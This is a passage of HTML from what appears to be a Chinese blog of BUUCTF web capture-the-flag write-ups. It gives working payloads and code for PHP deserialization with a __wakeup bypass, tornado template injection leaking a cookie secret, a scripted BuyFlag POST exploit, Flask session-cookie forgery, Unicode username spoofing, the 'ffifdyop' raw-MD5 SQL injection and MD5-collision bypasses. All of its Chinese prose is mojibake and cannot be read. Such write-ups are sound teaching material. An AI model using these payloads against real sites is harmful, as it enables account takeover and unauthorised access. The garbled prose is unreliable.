class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">unserialize</span>(@<span class="variable">$select</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ•…å¯èƒ½å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼ŒæŸ¥çœ‹<code>class.php</code>ï¼Œæ„é€ ååºåˆ—åŒ–å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Name</span>(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)).PHP_EOL;</span><br></pre></td></tr></table></figure><p>æœ€åçš„payloadæ³¨æ„å°†å±æ€§ä¸ªæ•°çš„å€¼å¤§äºå®é™…å±æ€§ä¸ªæ•°ï¼Œè¿™æ ·æ¥ç»•è¿‡<code>_wakeup</code>å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://a0fdf051-a2ba-4c99-b18a-b865bd40854b.node4.buuoj.cn:81/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D</span><br></pre></td></tr></table></figure><blockquote><p>ä¹‹æ‰€ä»¥ä½¿ç”¨urlencodeï¼Œæ˜¯å› ä¸ºè¾“å‡ºç»“æœä¸­Nameå’Œusernameï¼ŒNameå’Œpasswordä¹‹é—´æ˜¯æœ‰ä¸å¯è§å­—ç¬¦çš„ï¼Œå› ä¸ºprivate å£°æ˜çš„å­—æ®µä¸ºç§æœ‰å­—æ®µï¼Œåªåœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»å’Œè¯¥ç±»çš„å¯¹è±¡å®ä¾‹ä¸­å‡ä¸å¯è§ã€‚å› æ­¤ç§æœ‰å­—æ®µçš„å­—æ®µååœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Šasciiä¸º0çš„å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰ã€‚</p></blockquote><h2 id="ACTF2020-æ–°ç”Ÿèµ›-BackupFile"><a href="#ACTF2020-æ–°ç”Ÿèµ›-BackupFile" class="headerlink" title="[ACTF2020 æ–°ç”Ÿèµ›]BackupFile"></a>[ACTF2020 æ–°ç”Ÿèµ›]BackupFile</h2><p>è®¿é—®<code>/index.php.bak</code>è·å–æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼ å…¥å‚æ•°<code>/index.php?key=123</code>å³å¯ã€‚</p><h2 id="æŠ¤ç½‘æ¯-2018-easy-tornado"><a href="#æŠ¤ç½‘æ¯-2018-easy-tornado" class="headerlink" title="[æŠ¤ç½‘æ¯ 2018]easy_tornado"></a>[æŠ¤ç½‘æ¯ 2018]easy_tornado</h2><p>å°è¯•è®¿é—®<code>/file?filename=/fllllllllllllag&amp;filehash=7fd8270fd39d39b0929871611f8ae16c</code>ï¼Œè·³è½¬ç½‘é¡µ<code>/error?msg=Error</code>ã€‚</p><p>ç½‘ä¸Šæœç´¢<code>tornado</code>æ¡†æ¶æ¼æ´ï¼Œè®¿é—®<code>/error?msg=&#123;&#123;handler.settings&#125;&#125;</code>å¾—åˆ°</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;bb8b6eb6-7da3-40d4-a2b9-1fe70b347cfd&#x27;&#125; </span><br></pre></td></tr></table></figure><p>æ ¹æ®<code>hints.txt</code>ä¸­çš„å…¬å¼<code>md5(cookie_secret+md5(filename))</code>è·å–hashå€¼</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;bb8b6eb6-7da3-40d4-a2b9-1fe70b347cfd&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="string">&#x27;/fllllllllllllag&#x27;</span>));</span><br><span class="line"><span class="comment">//40b1b5314c975858de339d17ea5c5327</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/file?filename=/fllllllllllllag&amp;filehash=40b1b5314c975858de339d17ea5c5327</span><br></pre></td></tr></table></figure><blockquote><p>tornado renderæ˜¯pythonä¸­çš„ä¸€ä¸ªæ¸²æŸ“å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ç§æ¨¡æ¿ï¼Œé€šè¿‡è°ƒç”¨çš„å‚æ•°ä¸åŒï¼Œç”Ÿæˆä¸åŒçš„ç½‘é¡µï¼Œå¦‚æœç”¨æˆ·å¯¹renderå†…å®¹å¯æ§ï¼Œä¸ä»…å¯ä»¥æ³¨å…¥XSSä»£ç ï¼Œè€Œä¸”è¿˜å¯ä»¥é€šè¿‡<code>&#123;&#123;&#125;&#125;</code>è¿›è¡Œä¼ é€’å˜é‡å’Œæ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼ã€‚</p></blockquote><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-BuyFlag" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</h2><p>é€šè¿‡é¦–é¡µå³ä¸Šè§’èœå•è¿›å…¥<code>pay.php</code>ï¼ŒæŸ¥çœ‹æºç ååœ¨æœ€åº•éƒ¨å‘ç°ä¸€æ®µè¢«æ³¨é‡Šä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#x27;password&#x27;])) &#123;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#x27;t be number&lt;/br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password == 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹<code>cookie</code>çš„<code>user</code>å‚æ•°ç¡®ä¿<code>a student from CUIT</code>ï¼Œpostè¯·æ±‚ä¼ é€’<code>money</code>ä»¥åŠ<code>password</code>ï¼Œæ„é€ exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e57bb518-ccb6-4799-85a0-4be6f2483e5c.node4.buuoj.cn:81/pay.php&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;404a&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;money[]&#x27;</span>:<span class="string">&#x27;100000000&#x27;</span>, <span class="comment">#ç”¨æ•°ç»„ç»•è¿‡ï¼Œä¸ç„¶ä¼šæç¤ºé•¿åº¦è¿‡é•¿</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;Cookie&#x27;</span> :<span class="string">&#x27;td_cookie=1001369429;user=1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,headers=headers,data=data)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line"><span class="built_in">print</span>(re.findall(<span class="string">&#x27;flag&#123;.*?&#125;&#x27;</span>,response.text)[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨<code>hackbar</code></p><p><img src="https://img.gejiba.com/images/7e34ec20a72163fa01c9b4ace82753c2.png" alt="7e34ec20a72163fa01c9b4ace82753c2.png"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="æ³•ä¸€-å¼±å£ä»¤"><a href="#æ³•ä¸€-å¼±å£ä»¤" class="headerlink" title="æ³•ä¸€ å¼±å£ä»¤"></a>æ³•ä¸€ å¼±å£ä»¤</h3><p>å°è¯•äº†ä¸‹ç”¨æˆ·å<code>admin</code>å’Œå¯†ç <code>123</code>å‘ç°ç›´æ¥ç™»é™†æˆåŠŸè·å¾—flagäº†ã€‚ã€‚ã€‚</p><h3 id="æ³•äºŒ-flask-sessionä¼ªé€ "><a href="#æ³•äºŒ-flask-sessionä¼ªé€ " class="headerlink" title="æ³•äºŒ flask sessionä¼ªé€ "></a>æ³•äºŒ flask sessionä¼ªé€ </h3><p>æ³¨å†Œå¸å·ç™»é™†ååœ¨<code>change</code>é¡µé¢å‘ç°æºç åœ°å€</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨<code>config.py</code>ä¸­å‘ç°<code>SECRET_KEY</code>å€¼ä¸º<code>ckj123</code>ï¼Œç„¶åæŸ¥çœ‹è‡ªèº«<code>session</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJxFkE9rwkAQxb9K2bOH_LEXwYMlm5DCzLKym5C9iDbRZJK1kETUFb97FwvtaXj8Zt7w3oPtjmMztWw1j5dmwXZdzVYP9nZgKyYSeQdXDEB6aSz2YHUslL6BSztDaJE-BqFkiIl0oCAAdYqg5FdjtcOSB2D5zai0NVa-i8TvO7iKMo-BTkFFBVVeY7KlSulAZCmZMiVUbYuUh0D-g6o94xG6zdIoeYWMx-C0n9p7mx4zfccoD9DqNXsu2Nc0Hnfzd9-c_yJUrh4q8qdUd5B8DlVZWGMhBJdHQDLGrBhEWZBJdGSIh-hMD3L9suvs_tT8l8HTfLv5Jee99YDNzTSzBbtMzfiqjYUBe_4AXrRs8w.YqfSfQ.q8V8VQqzgvXkoXOw-HI4HWl5qGQ</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨<a href="https://blog.csdn.net/qq_42158602/article/details/103936540">å¤§ä½¬çš„è„šæœ¬</a>è§£å¯†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decryption</span>(<span class="params">payload</span>):</span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># print(decryption(sys.argv[1].encode()))</span></span><br><span class="line">    session = <span class="string">&#x27;.eJxFkE9rwkAQxb9K2bOH_LEXwYMlm5DCzLKym5C9iDbRZJK1kETUFb97FwvtaXj8Zt7w3oPtjmMztWw1j5dmwXZdzVYP9nZgKyYSeQdXDEB6aSz2YHUslL6BSztDaJE-BqFkiIl0oCAAdYqg5FdjtcOSB2D5zai0NVa-i8TvO7iKMo-BTkFFBVVeY7KlSulAZCmZMiVUbYuUh0D-g6o94xG6zdIoeYWMx-C0n9p7mx4zfccoD9DqNXsu2Nc0Hnfzd9-c_yJUrh4q8qdUd5B8DlVZWGMhBJdHQDLGrBhEWZBJdGSIh-hMD3L9suvs_tT8l8HTfLv5Jee99YDNzTSzBbtMzfiqjYUBe_4AXrRs8w.YqfSfQ.q8V8VQqzgvXkoXOw-HI4HWl5qGQ&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(session.encode()))</span><br></pre></td></tr></table></figure><p>è·å¾—ä»¥ä¸‹ä¿¡æ¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;84235e258fcd2e795131bf3f60e9454431341861a0fe35a42a1e1afd983f7309b7284b5cc3044ca548aceac58a62526c57ca16708e400a73500e42fd4e27b46e&#x27;, &#x27;csrf_token&#x27;: b&#x27;c7eb4027b02eaeffc53262474ee9ecd56f1576d1&#x27;, &#x27;image&#x27;: b&#x27;8AHD&#x27;, &#x27;name&#x27;: &#x27;test&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å…¶ä¸­<code>name</code>ä¸º<code>admin</code>ï¼Œå¹¶ä½¿ç”¨<a href="https://github.com/noraj/flask-session-cookie-manager">sessionå·¥å…·</a>è¿›è¡ŒåŠ å¯†ï¼ˆ<code>secret_key</code>å¯ä»¥åœ¨ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;ckj123&quot; -t &quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;84235e258fcd2e795131bf3f60e9454431341861a0fe35a42a1e1afd983f7309b7284b5cc3044ca548aceac58a62526c57ca16708e400a73500e42fd4e27b46e&#x27;, &#x27;csrf_token&#x27;: b&#x27;c7eb4027b02eaeffc53262474ee9ecd56f1576d1&#x27;, &#x27;image&#x27;: b&#x27;8AHD&#x27;, &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><p>è·å¾—åŠ å¯†åçš„session</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJxFkM1rwkAQxf-VMmcP-bAXwYMlH6Qws6zsJmQvok00mWQtREVd8X_vYqE9DY_fzBvee8BmP7WnDhbn6dLOYNM3sHjA2w4WIBJ5R1eOyHpuLA1odSyUvqHLesNkiT9GoWRIiXSoMEB1iLBKr8ZqR1UaoE1vRmWdsfJdJH7f4VVURYx8CGouufaakjXXSgciz9hUGZPqOuIiRPYfVONZGpFbzY2SV8zTGJ32U3tvM1Cu7xQVAVm9hOcMvk7TfnP-HtrjX4TaNWPN_pSbHpPPsa5KayyG6IoIWcaUl6OoSjaJjgynITkzoFy-7Hq7PbT_ZaRZsV79kuPWegDbxvZHmMHl1E6v3iAM4PkDy4ptPA.YqfTiA.v_KfECOg4L_7siBugo4wDmZ7Qh0</span><br></pre></td></tr></table></figure><p>ç”¨burpå‘åŒ…å³å¯</p><p><img src="https://img.gejiba.com/images/b9bc41d1864208f98c0bd431f61112b0.png" alt="b9bc41d1864208f98c0bd431f61112b0.png"></p><h3 id="æ³•ä¸‰-Unicodeæ¬ºéª—"><a href="#æ³•ä¸‰-Unicodeæ¬ºéª—" class="headerlink" title="æ³•ä¸‰ Unicodeæ¬ºéª—"></a>æ³•ä¸‰ Unicodeæ¬ºéª—</h3><p>ä½¿ç”¨<code>á´¬á´°á´¹á´µá´º</code>æ³¨å†Œè´¦æˆ·ï¼Œç„¶åå°±å¯ä»¥ç™»å½•ã€‚ç™»å½•æˆåŠŸåæ˜¾ç¤ºä½ ç”¨æˆ·åä¸º<code>ADMIN</code>ï¼Œç„¶åä¿®æ”¹å¯†ç ï¼Œæ­¤æ—¶å…¶å®æ˜¯æŠŠ<code>admin</code>çš„å¯†ç ä¿®æ”¹äº†ï¼Œç„¶åç™»å½•<code>admin</code>å³å¯ã€‚ä¸»è¦æ˜¯åˆ©ç”¨äº†<code>register</code>å’Œ<code>change</code>é‡Œé¢çš„æ¼æ´ï¼Œä¼šæŠŠè¾“å…¥å­—ç¬¦è½¬åŒ–æˆå°å†™ã€‚</p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Obs_cure/article/details/113805070?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-113805070-blog-103936540.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1-113805070-blog-103936540.pc_relevant_aa&utm_relevant_index=1">CTFå­¦ä¹ ç¬”è®°â€”â€”[HCTF 2018]admin</a></p></blockquote><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>ä½¿ç”¨<code>burp</code>æŠ“åŒ…å‘ç°<code>hint</code></p><p><img src="https://img.gejiba.com/images/cb8b462b474b2a4106b805b7706100ff.png" alt="cb8b462b474b2a4106b805b7706100ff.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>è¾“å…¥<code>ffifdyop</code>è¿›å…¥ä¸‹ä¸€å…³ï¼Œ</p><blockquote><p>ffifdyop è¿™ä¸ªå­—ç¬¦ä¸²è¢« md5 å“ˆå¸Œäº†ä¹‹åä¼šå˜æˆ 276f722736c95d99e921722cf9ed621cï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å‰å‡ ä½åˆšå¥½æ˜¯ â€˜ or â€˜6ï¼Œè€Œ Mysql åˆšå¥½åˆä¼šå§ hex è½¬æˆ ascii è§£é‡Šï¼Œå› æ­¤æ‹¼æ¥ä¹‹åçš„å½¢å¼æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=&#x27;&#x27; or &#x27;6xxxxx&#x27;</span><br></pre></td></tr></table></figure><p>æ€»ç»“ä¸‹3ä¸ªå¸¸ç”¨çš„ï¼šffifdyopï¼›e58ï¼›611686052576742364ï¼›</p></blockquote><p>ç­‰ä»·äº or ä¸€ä¸ªæ°¸çœŸå¼ï¼Œå› æ­¤ç›¸å½“äºä¸‡èƒ½å¯†ç ï¼Œå¯ä»¥ç»•è¿‡md5()å‡½æ•°</p><p>å‘ç°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br></pre></td></tr></table></figure><p>æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://16daade5-17e1-4422-b3e6-ac4f89b74c42.node4.buuoj.cn:81/levels91.php?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>post</code>è¯·æ±‚ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯è·å¾—flag</p><blockquote><p>è¿™é‡Œè‹¥æ˜¯ä¿®æ”¹åˆ¤æ–­æ¡ä»¶ä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>] &amp;&amp; </span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ï¼Œä½†å¯ä»¥é‡‡ç”¨MD5ç¢°æ’ï¼Œä¹Ÿå°±æ˜¯ä¸åŒå­—ç¬¦ä¸²ä½†æ˜¯MD5åå€¼ç›¸åŒçš„æƒ…å†µ</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s1</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s2</span> = <span class="string">&quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span>;</span><br><span class="line"><span class="variable">$s3</span> = <span 